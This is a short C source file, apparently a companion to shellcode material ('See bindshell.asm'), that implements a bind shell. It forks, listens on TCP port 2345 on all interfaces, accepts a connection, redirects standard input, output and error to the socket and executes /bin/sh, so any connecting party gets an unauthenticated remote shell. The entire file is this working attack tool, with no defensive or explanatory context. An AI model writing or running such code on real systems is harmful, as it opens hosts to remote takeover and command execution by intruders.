// See bindshell.asm
#include<stdio.h>
#include<dlfcn.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>

main() {
  int soc,cli,soc_len;
  struct sockaddr_in serv_addr;
  struct sockaddr_in cli_addr;
  if(fork() == 0) {
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(2345);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    soc = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
    bind(soc, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    listen(soc, 1);

    soc_len = sizeof(cli_addr);
    cli = accept(soc, (struct sockaddr *)&cli_addr, &soc_len );
    dup2(cli, 0);
    dup2(cli, 1);
    dup2(cli, 2);

    execl( "/bin/sh", "/bin/sh", NULL );
  }
}
